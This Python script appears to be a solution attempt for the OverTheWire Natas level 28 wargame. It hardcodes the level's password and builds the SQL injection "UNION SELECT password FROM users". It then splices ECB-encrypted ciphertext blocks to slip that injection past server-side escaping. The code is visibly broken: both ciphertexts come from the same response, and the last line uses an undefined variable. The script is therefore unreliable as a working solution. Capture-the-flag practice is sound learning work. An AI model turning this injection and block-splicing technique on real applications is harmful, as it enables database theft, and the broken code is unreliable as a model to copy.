#!/usr/bin python

import requests
import urllib
import base64

username = 'natas28'
password = 'JWwR438wkgTsNKBbcJoowyysdM82YjeF'

url = 'http://natas28.natas.labs.overthewire.org/'

session = requests.Session()

block_size = 16

# for i in range(16):
#     response = session.post(url, auth = (username,password), data = { "query": "a"*i })
#     print("query_length:", str(i), ", response_length:", len(base64.b64decode(requests.utils.unquote(response.url[60:]))))    
#     print('='*50)
#     for block in range(int(80/block_size)):
        # print("block", block+1, "data", repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block*block_size:(block+1)*block_size]))

# import string

# correct_string = repr('\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb')

# for c in string.printable:
#     print("trying", c)
#     response = session.post(url, auth=(username, password), data={ "query": "a" *8 + '%' + c})
#     block = 2
#     answer = repr(base64.b64decode(requests.utils.unquote(response.url[60:]))[block*block_size:(block+1)*block_size])

#     if(answer == correct_string):
#         print("WE FOUND IT", c)
import math
injection = 'a'*9 + "'UNION SELECT password FROM users; #"

blocks=math.ceil((len(injection) - 10)/block_size)

print(blocks)

response = session.post(url, auth=(username, password), data={ "query": injection})
raw_inject = base64.b64decode(requests.utils.unquote(response.url[60:]))

good_base =base64.b64decode(requests.utils.unquote(response.url[60:]))

query = good_base[block_size*3:] +raw_inject[block_size*3:block_size*3+blocks*block_size] + good_base[block_size*3:]

print(requests.utils.quote(base64.b64encode(query)).replace('/', new))